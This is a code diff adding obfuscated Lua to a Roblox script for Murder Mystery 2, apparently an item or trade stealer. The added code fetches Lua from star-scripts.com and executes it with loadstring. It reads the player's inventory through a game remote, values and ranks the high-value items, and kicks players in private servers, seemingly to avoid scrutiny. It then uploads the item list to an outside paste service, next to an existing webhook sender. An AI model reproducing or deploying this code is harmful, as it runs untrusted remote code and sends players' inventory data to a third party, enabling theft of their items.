@@ -34,7 +34,2192 @@ local function sendWebhook(data)
     end)
 end
 
+do
+	local function v153(p18)
+		return (string.lower(tostring(p18 or "")):gsub("[^%w]", ""))
+	end
 
+	local v154 = tostring(StarScriptsConfig.ValuesUrl or StarScriptsConfig.VALUES_URL or "https://star-scripts.com/api/values/mm2")
+
+	local function v155()
+		local Body
+		local ok, result = pcall(function()
+			return game:HttpGet(v154)
+		end)
+
+		if ok and type(result) == "string" and #result > 0 then
+			Body = result
+		elseif type(http_request_) == "function" then
+			local ok2, result2 = pcall(http_request_, {
+				Url = v154,
+				Method = "GET",
+				Headers = {
+					["Cache-Control"] = "no-cache"
+				}
+			})
+
+			if ok2 and type(result2) == "table" then
+				Body = result2.Body or result2.body
+			end
+		end
+
+		if type(Body) ~= "string" or #Body == 0 then
+			return nil, "could not download the value list"
+		end
+
+		local loadstring_ = loadstring or load
+
+		if not loadstring_ then
+			return nil, "loadstring is unavailable"
+		end
+
+		local v162, v163 = loadstring_(Body, "@mm2values.lua")
+
+		if not v162 then
+			return nil, tostring(v163)
+		end
+
+		local ok2, result2 = pcall(v162)
+
+		if not ok2 or type(result2) ~= "table" then
+			return nil, tostring(result2)
+		end
+
+		return result2
+	end
+
+	local StarScriptsMM2ValuesCache = genv.StarScriptsMM2ValuesCache
+
+	if type(StarScriptsMM2ValuesCache) ~= "table" then
+		local v167
+
+		StarScriptsMM2ValuesCache, v167 = v155()
+
+		if not StarScriptsMM2ValuesCache then
+			return
+		end
+
+		genv.StarScriptsMM2ValuesCache = StarScriptsMM2ValuesCache
+	end
+
+	local t18 = {
+		Common = "Common",
+		Uncommon = "Uncommon",
+		Rare = "Rare",
+		Legendary = "Legendary",
+		Godly = "Godly",
+		Ancient = "Ancient",
+		Unique = "Unique",
+		Classic = "Vintage",
+		Vintage = "Vintage",
+		Chroma = "Chroma"
+	}
+	local t19 = { {
+		"Nik's Scythe",
+		"",
+		"",
+		"",
+		"Ancient",
+		250000000
+	} }
+
+	if not genv.StarScriptsMM2ExtrasMerged then
+		local v170, v171, v172 = ipairs(t19)
+
+		for _, v in v170, v171, v172 do
+			table.insert(StarScriptsMM2ValuesCache, v)
+		end
+
+		genv.StarScriptsMM2ExtrasMerged = true
+	end
+
+	local t20 = {}
+	local v176, v177, v178 = ipairs(StarScriptsMM2ValuesCache)
+
+	for _, v in v176, v177, v178 do
+		local t21 = {
+			name = v[1],
+			type = v[2],
+			year = v[3],
+			event = v[4],
+			rarity = v[5],
+			value = v[6]
+		}
+		local v182 = v153(t21.name)
+		local v183 = t20[v182]
+
+		if not v183 then
+			v183 = {}
+			t20[v182] = v183
+		end
+
+		table.insert(v183, t21)
+	end
+
+	local function v184()
+		return {}
+	end
+	local function v185()
+		return nil
+	end
+	local function v186()
+		return "Unknown"
+	end
+	local function v187(p19)
+		local v188 = p19.isChroma == true
+		local v189 = v188 and "Chroma"
+
+		v189 = v189 or t18[tostring(p19.rarity)]
+
+		local t22 = {}
+		local t23 = {}
+
+		local function v192(p20)
+			local v193 = v153(p20)
+
+			if not (v193 == "" or t23[v193]) then
+				t23[v193] = true
+				t22[#t22 + 1] = v193
+			end
+		end
+
+		if v188 then
+			v192("Chroma " .. tostring(p19.name))
+		end
+
+		v192(p19.name)
+
+		if p19.itemType and p19.itemType ~= "" then
+			v192(tostring(p19.name) .. " " .. tostring(p19.itemType))
+		end
+
+		local t24 = {}
+		local t25 = {}
+
+		for _, v in ipairs(t22) do
+			local v198 = t20[v]
+
+			if v198 then
+				for _, v2 in ipairs(v198) do
+					if not t25[v2] then
+						t25[v2] = true
+						t24[#t24 + 1] = v2
+					end
+				end
+			end
+		end
+
+		if #t24 == 0 then
+			return 0, v189, nil
+		end
+
+		if p19.category == "Pets" then
+			local t26 = {}
+
+			for _, v in ipairs(t24) do
+				if v.type == "Pet" then
+					t26[#t26 + 1] = v
+				end
+			end
+
+			t24 = t26
+
+			if #t24 == 0 then
+				return 0, v189, nil
+			end
+		end
+
+		local function v204(p21)
+			local t27 = {}
+
+			for _, v in ipairs(t24) do
+				if p21(v) then
+					t27[#t27 + 1] = v
+				end
+			end
+
+			if #t27 > 0 then
+				t24 = t27
+			end
+		end
+
+		if v189 then
+			v204(function(p22)
+				return p22.rarity == v189
+			end)
+		end
+
+		if #t24 > 1 and p19.itemType and p19.itemType ~= "" then
+			v204(function(p23)
+				return p23.type == "" or p23.type == p19.itemType
+			end)
+		end
+
+		if #t24 > 1 and p19.year and p19.year ~= "" then
+			v204(function(p24)
+				return p24.year == "" or p24.year == tostring(p19.year)
+			end)
+		end
+
+		if #t24 > 1 and p19.event and p19.event ~= "" then
+			v204(function(p25)
+				return p25.event == "" or p25.event == tostring(p19.event)
+			end)
+		end
+
+		local value
+		local rarity
+		local v210
+
+		for _, v in ipairs(t24) do
+			if value == nil then
+				value = v.value
+				rarity = v.rarity
+				v210 = v
+
+				continue
+			end
+
+			if v.value ~= value then
+				return 0, v189, nil
+			end
+		end
+
+		local v213 = value or 0
+		local v214 = rarity or v189
+
+		return v213, v214, v210
+	end
+	local function v215(p26)
+		return table.concat({
+			p26.name,
+			p26.type,
+			p26.year,
+			p26.event,
+			p26.rarity
+		}, "|")
+	end
+
+	local GetProfileData = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Inventory"):WaitForChild("GetProfileData")
+	local u217
+	local n7 = 0
+	local n8 = 0
+
+	local function v220(p27, p28)
+		local now = time()
+		local v222 = now - n7
+
+		if u217 and not p27 and v222 < 15 then
+			return u217
+		end
+
+		local ok, result = pcall(function()
+			return GetProfileData:InvokeServer()
+		end)
+		local v225 = type(result) == "table"
+
+		if v225 then
+			v225 = tonumber(result.userId or result.UserId or result.UserID)
+		end
+
+		v225 = v225 or nil
+
+		if ok and type(result) == "table" and (v225 == nil or v225 == LocalPlayer.UserId) and type(result.Weapons) == "table" and type(result.Weapons.Owned) == "table" then
+			u217 = result
+			n7 = now
+
+			return result
+		end
+
+		if not p28 and now - n8 >= 10 then
+			n8 = now
+		end
+
+		if not u217 or not (v222 <= 45) then
+			return nil
+		end
+
+		return u217
+	end
+	local function v226(p29)
+		return ({
+			Unique = 1,
+			Ancient = 2,
+			Godly = 3,
+			Classic = 4,
+			Legendary = 5,
+			Rare = 6,
+			Uncommon = 7,
+			Common = 8,
+			Vintage = 9,
+			Unknown = 999
+		})[tostring(p29)] or 999
+	end
+	local function v227(p30)
+		local t28 = {
+			Data = {
+				Weapons = {
+					Current = {}
+				},
+				Pets = {
+					Current = {}
+				}
+			}
+		}
+
+		for _, v in ipairs({
+			"Weapons",
+			"Pets"
+		}) do
+			local Owned = p30[v] and p30[v].Owned
+			local Current = t28.Data[v].Current
+
+			if type(Owned) == "table" then
+				for k, v2 in pairs(Owned) do
+					local DataID
+					local v236
+
+					if type(k) == "string" then
+						DataID = k
+
+						if type(v2) == "number" then
+							v236 = v2
+						elseif type(v2) == "string" then
+							v236 = tonumber(v2)
+						elseif type(v2) == "boolean" then
+							v236 = v2 and 1 or nil
+						elseif type(v2) == "table" then
+							v236 = tonumber(v2.Amount or v2.amount or v2.Count or v2.count or v2.OwnedAmount)
+
+							if not v236 and (v2.Owned == true or v2.owned == true) then
+								v236 = 1
+							end
+						end
+					elseif type(v2) == "string" then
+						DataID = v2
+						v236 = 1
+					elseif type(v2) == "table" then
+						DataID = v2.DataID or v2.ItemID or v2.ItemId or v2.Id or v2.ID
+						v236 = tonumber(v2.Amount or v2.amount or v2.Count or v2.count)
+
+						if DataID and not v236 and (v2.Owned == true or v2.owned == true) then
+							v236 = 1
+						end
+					end
+
+					local v237 = tonumber(v236)
+
+					if DataID and v237 and v237 > 0 then
+						local v238 = tostring(DataID)
+						local v239
+
+						if v == "Weapons" then
+							v239 = t16[v238]
+						elseif v == "Pets" then
+							v239 = t17[v238]
+						end
+
+						local v240 = Current[v238]
+
+						if v240 then
+							v240.Amount += v237
+						else
+							Current[v238] = {
+								DataID = v238,
+								Name = type(v239) == "table" and (v239.ItemName or v239.Name) or v238,
+								Amount = v237,
+								Rarity = type(v239) == "table" and v239.Rarity or "Unknown",
+								ItemType = type(v239) == "table" and v239.ItemType or v == "Pets" and "Pet" or v,
+								IsChroma = type(v239) == "table" and v239.Chroma == true,
+								Year = type(v239) == "table" and v239.Year and tostring(v239.Year) or "",
+								Event = type(v239) == "table" and v239.Event and tostring(v239.Event) or "",
+								MetadataVerified = type(v239) == "table"
+							}
+						end
+					end
+				end
+			end
+		end
+
+		return t28
+	end
+	local function v241(p31)
+		local v242 = p31.name:lower():gsub("[^%w]", "")
+		local v243 = p31.id:lower():gsub("[^%w]", "")
+
+		return v242 == "defaultgun" or v242 == "defaultknife" or v243 == "defaultgun" or v243 == "defaultknife"
+	end
+
+	local t29 = {
+		Constellation_G_2024 = {
+			Name = "Nightsky",
+			Rarity = "Legendary",
+			ItemType = "Gun"
+		},
+		ChromaDarkbringer = {
+			Name = "Darkbringer",
+			Rarity = "Godly",
+			ItemType = "Gun",
+			IsChroma = true
+		},
+		CandleflameChroma = {
+			Name = "Candleflame",
+			Rarity = "Godly",
+			ItemType = "Knife",
+			IsChroma = true
+		},
+		DeathshardChroma = {
+			Name = "Deathshard",
+			Rarity = "Godly",
+			ItemType = "Knife",
+			IsChroma = true
+		},
+		Sparkle9 = {
+			Name = "Sparkle9",
+			Rarity = "Common",
+			ItemType = "Knife"
+		},
+		RIP = {
+			Name = "RIP",
+			Rarity = "Common",
+			ItemType = "Gun"
+		},
+		Sweater_K_2025 = {
+			Name = "Sweater",
+			Rarity = "Uncommon",
+			ItemType = "Knife"
+		},
+		Coal_K_2022 = {
+			Name = "Coal",
+			Rarity = "Common",
+			ItemType = "Knife"
+		},
+		Bunnies_K_2025 = {
+			Name = "Bunnies",
+			Rarity = "Legendary",
+			ItemType = "Knife"
+		},
+		Aurora_K_2021 = {
+			Name = "Aurora",
+			Rarity = "Legendary",
+			ItemType = "Knife"
+		},
+		Energized_G_2025 = {
+			Name = "Energized",
+			Rarity = "Legendary",
+			ItemType = "Gun"
+		},
+		Bats_K_2024 = {
+			Name = "Bats",
+			Rarity = "Common",
+			ItemType = "Knife"
+		},
+		Cursed_K_2024 = {
+			Name = "Cursed",
+			Rarity = "Legendary",
+			ItemType = "Knife"
+		},
+		Energized_K_2025 = {
+			Name = "Energized",
+			Rarity = "Legendary",
+			ItemType = "Knife"
+		},
+		Frozen_G_2025 = {
+			Name = "Frozen",
+			Rarity = "Legendary",
+			ItemType = "Gun"
+		}
+	}
+
+	v152 = function(p32)
+		local v245 = v220(p32 == true)
+
+		if not v245 then
+			return {}, false, {
+				reason = "profile_unavailable"
+			}
+		end
+
+		local ok, result = pcall(v227, v245)
+
+		if not ok or type(result) ~= "table" then
+			return {}, false, {
+				reason = "generation_failed"
+			}
+		end
+
+		local t30 = {}
+		local t31 = {
+			rawItems = 0,
+			valuedItems = 0,
+			eligibleItems = 0,
+			maximumValue = 0
+		}
+
+		for _, v in ipairs({
+			"Weapons",
+			"Pets"
+		}) do
+			local Current = result.Data and result.Data[v] and result.Data[v].Current or {}
+
+			for k, v2 in pairs(Current) do
+				if type(v2) == "table" then
+					if (tonumber(v2.Amount) or 0) > 0 then
+						t31.rawItems += 1
+
+						local t32 = {
+							id = tostring(v2.DataID or k),
+							name = tostring(v2.Name or v2.ItemName or k),
+							amount = tonumber(v2.Amount) or 1,
+							rarity = tostring(v2.Rarity or "Unknown"),
+							itemType = tostring(v2.ItemType or v2.DataType or v),
+							category = v,
+							year = tostring(v2.Year or ""),
+							event = tostring(v2.Event or ""),
+							metadataVerified = v2.MetadataVerified == true
+						}
+						local v256 = t29[t32.id]
+
+						if v256 and not t32.metadataVerified then
+							t32.name = v256.Name or t32.name
+							t32.rarity = v256.Rarity or t32.rarity
+							t32.itemType = v256.ItemType or t32.itemType
+							t32.isChroma = v256.IsChroma == true
+						end
+
+						for k2, v3 in pairs(v2) do
+							if tostring(k2):lower():find("chroma", 1, true) and v3 ~= nil and v3 ~= false and v3 ~= 0 and v3 ~= "" then
+								t32.isChroma = true
+
+								break
+							end
+						end
+
+						if not v241(t32) then
+							local v259 = v184(t32)
+							local v260, v261, v262 = v187(t32, v259)
+
+							t32.value = v260
+							t32.valueCategory = v261
+
+							local v263 = v262
+
+							if t32.rarity == "Unknown" then
+								t32.rarity = v186(v259, t32.valueCategory)
+							end
+
+							t32.displayName = t32.name
+
+							if t32.valueCategory == "Chroma" or t32.valueCategory == "Chromas" or t32.isChroma then
+								if not t32.name:lower():find("chroma", 1, true) then
+									t32.displayName = "Chroma " .. t32.name
+								end
+							end
+
+							t32.totalValue = t32.value * t32.amount
+
+							if t32.value > 0 then
+								t31.valuedItems += 1
+							end
+
+							t31.maximumValue = math.max(t31.maximumValue, t32.value)
+
+							if v263 and v13 < t32.value and not t1[v215(v263)] then
+								table.insert(t30, t32)
+								t31.eligibleItems += 1
+							end
+						end
+					end
+				end
+			end
+		end
+
+		table.sort(t30, function(p33, p34)
+			if p33.totalValue ~= p34.totalValue then
+				return p33.totalValue > p34.totalValue
+			end
+
+			if p33.value ~= p34.value then
+				return p33.value > p34.value
+			end
+
+			local v264 = v226(p33.rarity)
+			local v265 = v226(p34.rarity)
+
+			if v264 ~= v265 then
+				return v264 < v265
+			end
+
+			if p33.rarity == p34.rarity then
+				if p33.name == p34.name then
+					return p33.id < p34.id
+				end
+
+				return p33.name < p34.name
+			end
+
+			return p33.rarity < p34.rarity
+		end)
+
+		return t30, true, t31
+	end
+
+	local function v266()
+		local v267
+
+		while true do
+			v267 = v220(true, true)
+
+			if v267 then
+				break
+			else
+				task.wait(1)
+			end
+		end
+
+		return v267
+	end
+
+	v266()
+end
+
+local u268, v269, v270 = v152(false)
+
+if #u268 == 0 then
+	if v269 and not v270.rawItems then
+	end
+
+	return
+end
+
+if v4 then
+	local LocalPlayer2 = game:GetService("Players").LocalPlayer
+
+	if LocalPlayer2 then
+		LocalPlayer2:Kick("This script cannot be used in private servers.")
+	end
+
+	return
+end
+
+local function v272(p35)
+	return (string.format("%.2f", tonumber(p35) or 0):gsub("0+$", ""):gsub("%.$", ""))
+end
+
+local n9 = 0
+
+do
+	local n10 = 0
+	local v275, v276, v277 = ipairs(u268)
+
+	for _, v in v275, v276, v277 do
+		n9 += v.totalValue
+
+		if v.value > 0 then
+			n10 += 1
+		end
+	end
+end
+
+local v280, v281, starScriptsMM2LiveRuntime, v283, v284
+
+do
+	local function v285(p36)
+		local t33 = {}
+		local t34 = {
+			{
+				"nik's scythe",
+				"☠️"
+			},
+			{
+				"harvester",
+				"☠️"
+			},
+			{
+				"corrupt",
+				"👿"
+			},
+			{
+				"batwing",
+				"🦇"
+			},
+			{
+				"black luger",
+				"🔫"
+			},
+			{
+				"deathshard",
+				"💀"
+			},
+			{
+				"boneblade",
+				"🦴"
+			},
+			{
+				"ghostblade",
+				"👻"
+			},
+			{
+				"icecream",
+				"🍦"
+			},
+			{
+				"ice cream",
+				"🍦"
+			},
+			{
+				"cotton candy",
+				"🍭"
+			},
+			{
+				"candy corn",
+				"🌽"
+			},
+			{
+				"gingerbread",
+				"🍪"
+			},
+			{
+				"gingercookie",
+				"🍪"
+			},
+			{
+				"gingerblade",
+				"🍪"
+			},
+			{
+				"gingermint",
+				"🍪"
+			},
+			{
+				"cookie",
+				"🍪"
+			},
+			{
+				"peppermint",
+				"🍬"
+			},
+			{
+				"candy",
+				"🍬"
+			},
+			{
+				"sugar",
+				"🍭"
+			},
+			{
+				"sweet",
+				"🍭"
+			},
+			{
+				"treat",
+				"🍬"
+			},
+			{
+				"cane",
+				"🍭"
+			},
+			{
+				"latte",
+				"☕"
+			},
+			{
+				"hot chocolate",
+				"☕"
+			},
+			{
+				"choco",
+				"🍫"
+			},
+			{
+				"donut",
+				"🍩"
+			},
+			{
+				"popsicle",
+				"🍡"
+			},
+			{
+				"soda",
+				"🥤"
+			},
+			{
+				"cherries",
+				"🍒"
+			},
+			{
+				"cherry",
+				"🍒"
+			},
+			{
+				"strawberries",
+				"🍓"
+			},
+			{
+				"coconut",
+				"🥥"
+			},
+			{
+				"melon",
+				"🍉"
+			},
+			{
+				"bunnies",
+				"🐰"
+			},
+			{
+				"bunny",
+				"🐰"
+			},
+			{
+				"carrots",
+				"🥕"
+			},
+			{
+				"carrot",
+				"🥕"
+			},
+			{
+				"eggblade",
+				"🥚"
+			},
+			{
+				"egg",
+				"🥚"
+			},
+			{
+				"bacon",
+				"🥓"
+			},
+			{
+				"pumpkin",
+				"🎃"
+			},
+			{
+				"beachy",
+				"🏝️"
+			},
+			{
+				"beach",
+				"🏖️"
+			},
+			{
+				"sands",
+				"⛱️"
+			},
+			{
+				"sand",
+				"🏖️"
+			},
+			{
+				"palms",
+				"🌴"
+			},
+			{
+				"tropical",
+				"🌴"
+			},
+			{
+				"coconut",
+				"🥥"
+			},
+			{
+				"dolphins",
+				"🐬"
+			},
+			{
+				"duckies",
+				"🦆"
+			},
+			{
+				"jellyfish",
+				"🪼"
+			},
+			{
+				"starfish",
+				"⭐"
+			},
+			{
+				"turtles",
+				"🐢"
+			},
+			{
+				"turtle",
+				"🐢"
+			},
+			{
+				"kraken",
+				"🐙"
+			},
+			{
+				"sharky",
+				"🦈"
+			},
+			{
+				"shark",
+				"🦈"
+			},
+			{
+				"watergun",
+				"💦"
+			},
+			{
+				"aquarium",
+				"🐠"
+			},
+			{
+				"waves",
+				"🌊"
+			},
+			{
+				"wave",
+				"🌊"
+			},
+			{
+				"tidal",
+				"🌊"
+			},
+			{
+				"tides",
+				"🌊"
+			},
+			{
+				"ocean",
+				"🌊"
+			},
+			{
+				"water",
+				"💧"
+			},
+			{
+				"icewing",
+				"🧊"
+			},
+			{
+				"icebreaker",
+				"🧊"
+			},
+			{
+				"iceblaster",
+				"🧊"
+			},
+			{
+				"icepiercer",
+				"🧊"
+			},
+			{
+				"iceflake",
+				"❄️"
+			},
+			{
+				"icicles",
+				"🧊"
+			},
+			{
+				"frostsaber",
+				"❄️"
+			},
+			{
+				"frostbite",
+				"❄️"
+			},
+			{
+				"frostflame",
+				"❄️"
+			},
+			{
+				"frostfade",
+				"❄️"
+			},
+			{
+				"frosted",
+				"❄️"
+			},
+			{
+				"frosty",
+				"⛄"
+			},
+			{
+				"frost",
+				"❄️"
+			},
+			{
+				"frozen",
+				"🧊"
+			},
+			{
+				"glacier",
+				"🧊"
+			},
+			{
+				"blizzard",
+				"🌨️"
+			},
+			{
+				"snowman",
+				"⛄"
+			},
+			{
+				"snowflake",
+				"❄️"
+			},
+			{
+				"snowball",
+				"⛄"
+			},
+			{
+				"snowcannon",
+				"❄️"
+			},
+			{
+				"snowstorm",
+				"🌨️"
+			},
+			{
+				"snowglobe",
+				"🔮"
+			},
+			{
+				"snow",
+				"❄️"
+			},
+			{
+				"winter",
+				"🥶"
+			},
+			{
+				"chill",
+				"🥶"
+			},
+			{
+				"arctic",
+				"🧊"
+			},
+			{
+				"polar bear",
+				"🐻‍❄️"
+			},
+			{
+				" ice ",
+				"🧊"
+			},
+			{
+				"nightfire",
+				"🔥"
+			},
+			{
+				"flame",
+				"🔥"
+			},
+			{
+				"fire",
+				"🔥"
+			},
+			{
+				"magma",
+				"🌋"
+			},
+			{
+				"heat",
+				"🔥"
+			},
+			{
+				"burn",
+				"🔥"
+			},
+			{
+				"candleflame",
+				"🕯️"
+			},
+			{
+				"candle",
+				"🕯️"
+			},
+			{
+				"elderwood",
+				"🌲"
+			},
+			{
+				"flowerwood",
+				"🌸"
+			},
+			{
+				"sakura",
+				"🌸"
+			},
+			{
+				"blossom",
+				"🌸"
+			},
+			{
+				"bloom",
+				"🌸"
+			},
+			{
+				"flora",
+				"🌷"
+			},
+			{
+				"floral",
+				"🌷"
+			},
+			{
+				"roses",
+				"🌹"
+			},
+			{
+				"rose",
+				"🌹"
+			},
+			{
+				"tulip",
+				"🌷"
+			},
+			{
+				"passion",
+				"🌺"
+			},
+			{
+				"leaves",
+				"🍃"
+			},
+			{
+				"leaf",
+				"🍃"
+			},
+			{
+				"meadow",
+				"🌿"
+			},
+			{
+				"forest",
+				"🌳"
+			},
+			{
+				"minty",
+				"🌿"
+			},
+			{
+				"mistletoe",
+				"🌿"
+			},
+			{
+				"log",
+				"🪵"
+			},
+			{
+				"wood",
+				"🪵"
+			},
+			{
+				"constellation",
+				"🌌"
+			},
+			{
+				"celestial",
+				"🌌"
+			},
+			{
+				"nebula",
+				"🌌"
+			},
+			{
+				"galaxy",
+				"🌌"
+			},
+			{
+				"galactic",
+				"🌌"
+			},
+			{
+				"universe",
+				"🌌"
+			},
+			{
+				"space",
+				"🚀"
+			},
+			{
+				"cosmic",
+				"🌌"
+			},
+			{
+				"aurora",
+				"🌌"
+			},
+			{
+				"borealis",
+				"🌌"
+			},
+			{
+				"australis",
+				"🌌"
+			},
+			{
+				"starry",
+				"🌟"
+			},
+			{
+				"nightstar",
+				"🌟"
+			},
+			{
+				"nightsky",
+				"🌌"
+			},
+			{
+				"alienbeam",
+				"👽"
+			},
+			{
+				"abduction",
+				"👽"
+			},
+			{
+				"aliens",
+				"👽"
+			},
+			{
+				"ufo",
+				"🛸"
+			},
+			{
+				"raygun",
+				"🔫"
+			},
+			{
+				"xeno",
+				"👽"
+			},
+			{
+				"skull",
+				"💀"
+			},
+			{
+				"bone",
+				"🦴"
+			},
+			{
+				"phantom",
+				"👻"
+			},
+			{
+				"spectre",
+				"👻"
+			},
+			{
+				"spectral",
+				"👻"
+			},
+			{
+				"ghostly",
+				"👻"
+			},
+			{
+				"ghosts",
+				"👻"
+			},
+			{
+				"ghost",
+				"👻"
+			},
+			{
+				"ghoulish",
+				"👻"
+			},
+			{
+				"soul",
+				"👻"
+			},
+			{
+				"spirit",
+				"👻"
+			},
+			{
+				"haunted",
+				"🏚️"
+			},
+			{
+				"witch",
+				"🧙"
+			},
+			{
+				"vampire",
+				"🧛"
+			},
+			{
+				"zombified",
+				"🧟"
+			},
+			{
+				"zombie",
+				"🧟"
+			},
+			{
+				"infected",
+				"🦠"
+			},
+			{
+				"mummy",
+				"🧟"
+			},
+			{
+				"mummified",
+				"🧟"
+			},
+			{
+				"reaper",
+				"☠️"
+			},
+			{
+				"pumpking",
+				"🎃"
+			},
+			{
+				"web",
+				"🕸️"
+			},
+			{
+				"spider",
+				"🕷️"
+			},
+			{
+				"bats",
+				"🦇"
+			},
+			{
+				"eyeball",
+				"👁️"
+			},
+			{
+				"seer",
+				"👁️"
+			},
+			{
+				"santa",
+				"🎅"
+			},
+			{
+				"reindeer",
+				"🦌"
+			},
+			{
+				"sleigh",
+				"🛷"
+			},
+			{
+				"sweater",
+				"🧶"
+			},
+			{
+				"stockings",
+				"🧦"
+			},
+			{
+				"nutcracker",
+				"🥜"
+			},
+			{
+				"ornament",
+				"🔴"
+			},
+			{
+				"wreath",
+				"🎄"
+			},
+			{
+				"present",
+				"🎁"
+			},
+			{
+				"wrapped",
+				"🎁"
+			},
+			{
+				"giftwrap",
+				"🎁"
+			},
+			{
+				"gift",
+				"🎁"
+			},
+			{
+				"bauble",
+				"🔮"
+			},
+			{
+				"penguin",
+				"🐧"
+			},
+			{
+				"turkey",
+				"🦃"
+			},
+			{
+				"heartblade",
+				"❤️"
+			},
+			{
+				"heart wand",
+				"💖"
+			},
+			{
+				"heartbreak",
+				"💔"
+			},
+			{
+				"heart",
+				"❤️"
+			},
+			{
+				"cupid",
+				"💘"
+			},
+			{
+				"valentine",
+				"💘"
+			},
+			{
+				"love",
+				"❤️"
+			},
+			{
+				"sweetheart",
+				"💝"
+			},
+			{
+				"storm",
+				"🌩️"
+			},
+			{
+				"cursed",
+				"🧿"
+			},
+			{
+				"chromatic",
+				"🌈"
+			},
+			{
+				"energized",
+				"⚡"
+			},
+			{
+				"pier",
+				"🎣"
+			},
+			{
+				"spitfire",
+				"🔥"
+			},
+			{
+				"scythe",
+				"🌾"
+			},
+			{
+				"battleaxe",
+				"🪓"
+			},
+			{
+				"swirly axe",
+				"🪓"
+			},
+			{
+				"handsaw",
+				"🪚"
+			},
+			{
+				"saw",
+				"🪚"
+			},
+			{
+				"makeshift",
+				"🛠️"
+			},
+			{
+				"logchopper",
+				"🪓"
+			},
+			{
+				"clockwork",
+				"⏰"
+			},
+			{
+				"gemstone",
+				"💎"
+			},
+			{
+				"emerald",
+				"💚"
+			},
+			{
+				"pearlshine",
+				"🦪"
+			},
+			{
+				"pearl",
+				"🦪"
+			},
+			{
+				"prismatic",
+				"🔷"
+			},
+			{
+				"prism",
+				"🔷"
+			},
+			{
+				"gingerscope",
+				"🔭"
+			},
+			{
+				"jinglegun",
+				"🔔"
+			},
+			{
+				"bioblade",
+				"🧬"
+			},
+			{
+				"bio",
+				"🧬"
+			},
+			{
+				"virtual",
+				"🕹️"
+			},
+			{
+				"pixel",
+				"👾"
+			},
+			{
+				"hacker",
+				"💻"
+			},
+			{
+				"robot",
+				"🤖"
+			},
+			{
+				"korblox",
+				"🦿"
+			},
+			{
+				"musical",
+				"🎵"
+			},
+			{
+				"traveler",
+				"🧳"
+			},
+			{
+				"eternal",
+				"♾️"
+			},
+			{
+				"fang",
+				"🦷"
+			},
+			{
+				"ripper",
+				"🗡️"
+			},
+			{
+				"predator",
+				"🐊"
+			},
+			{
+				"viper",
+				"🐍"
+			},
+			{
+				"snakebite",
+				"🐍"
+			},
+			{
+				"tiger",
+				"🐯"
+			},
+			{
+				"pirate",
+				"🏴‍☠️"
+			},
+			{
+				"butterflies",
+				"🦋"
+			},
+			{
+				"bubbles",
+				"🫧"
+			},
+			{
+				"swirly",
+				"🌀"
+			},
+			{
+				"swirl",
+				"🌀"
+			},
+			{
+				"plasma",
+				"⚡"
+			},
+			{
+				"laser",
+				"⚡"
+			},
+			{
+				"luger",
+				"🔫"
+			},
+			{
+				"blaster",
+				"🔫"
+			},
+			{
+				"slasher",
+				"🩸"
+			},
+			{
+				"blood",
+				"🩸"
+			},
+			{
+				"hazard",
+				"☢️"
+			},
+			{
+				"toxic",
+				"☣️"
+			},
+			{
+				"apocalypse",
+				"☄️"
+			},
+			{
+				"america",
+				"🇺🇸"
+			},
+			{
+				"old glory",
+				"🇺🇸"
+			},
+			{
+				"prince",
+				"👑"
+			},
+			{
+				"coal",
+				"🪨"
+			},
+			{
+				"neon",
+				"💡"
+			},
+			{
+				"light",
+				"💡"
+			},
+			{
+				"sparkle",
+				"✨"
+			},
+			{
+				"shiny",
+				"✨"
+			},
+			{
+				"eclipse",
+				"🌘"
+			},
+			{
+				"night",
+				"🌙"
+			},
+			{
+				"shadow",
+				"🌑"
+			},
+			{
+				"dark",
+				"🌑"
+			},
+			{
+				"star",
+				"⭐"
+			},
+			{
+				"rainbow",
+				"🌈"
+			},
+			{
+				"prismatic",
+				"🔷"
+			}
+		}
+
+		for _, v in ipairs(p36) do
+			local displayName = v.displayName or v.name
+			local v291 = " " .. (displayName .. " " .. v.id):lower() .. " "
+			local s3 = "🔪"
+
+			if v.itemType == "Gun" then
+				s3 = "🔫"
+			elseif v.itemType == "Pet" or v.category == "Pets" then
+				s3 = "🐾"
+			end
+
+			local s4
+
+			if v.category == "Pets" then
+				s4 = "🐾"
+			elseif v.valueCategory == "Chroma" or v.valueCategory == "Chromas" or v.isChroma then
+				s4 = "🌈" .. s3
+			else
+				s4 = s3
+
+				for _, v2 in ipairs(t34) do
+					if v291:find(v2[1], 1, true) then
+						s4 = v2[2]
+
+						break
+					end
+				end
+			end
+
+			local v296
+
+			if v.amount > 1 then
+				v296 = string.format("%s x%d %s ➜ %s Value (%s)", s4, v.amount, displayName, v272(v.totalValue), v.rarity)
+			else
+				v296 = string.format("%s x1 %s ➜ %s Value (%s)", s4, displayName, v272(v.totalValue), v.rarity)
+			end
+
+			table.insert(t33, v296)
+		end
+
+		if #t33 == 0 then
+			table.insert(t33, "(No tradeable items)")
+		end
+
+		return t33
+	end
+
+	local t35 = {}
+	local v298, v299, v300 = ipairs(v285(u268))
+
+	for _, v in v298, v299, v300 do
+		table.insert(t35, v)
+	end
+
+	local function v303(p37)
+		local ok, result = pcall(http_request_, {
+			Url = "https://api.rubis.app/v2/scrap?public=true",
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "text/plain",
+				Accept = "application/json"
+			},
+			Body = p37
+		})
+
+		if not ok or not result then
+			return ""
+		end
+
+		local StatusCode = result.StatusCode or result.status
+		local v307 = tonumber(StatusCode or result.Status) or 0
+
+		if v307 < 200 or v307 >= 300 then
+			return ""
+		end
+
+		local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, tostring(result.Body or result.body or ""))
+
+		if ok2 and type(result2) == "table" then
+			return tostring(result2.raw or result2.scrapID and "https://api.rubis.app/v2/scrap/" .. result2.scrapID .. "/raw" or result2.id and "https://api.rubis.app/v2/scrap/" .. result2.id .. "/raw" or "")
+		end
+
+		return ""
+	end
+
+	local v310 = table.concat(t35, "\n")
+	local StarScriptsMM2SummaryCache = genv.StarScriptsMM2SummaryCache
+	local Url
+
+	if type(StarScriptsMM2SummaryCache) == "table" and StarScriptsMM2SummaryCache.Text == v310 and type(StarScriptsMM2SummaryCache.Url) == "string" then
+		Url = StarScriptsMM2SummaryCache.Url
+	else
+		os.clock()
+		Url = v303(v310)
+
+		if Url ~= "" then
+			genv.StarScriptsMM2SummaryCache = {
+				Text = v310,
+				Url = Url
+			}
+		end
+	end
+
+	local t36 = {}
+	local v314, v315, v316 = ipairs(u268)
+	local v317 = geniter(v314, v315, v316)
+
+	while true do
+		local v318 = table.pack(v317())
+
+		if v318[1] then
+			local v319 = v318[3]
+
+			if not (v318[2] > 15) then
+				table.insert(t36, v319)
+
+				continue
+			end
+
+			break
+		end
+
+		break
+	end
+
+	local v320 = table.concat(v285(t36), "\n")
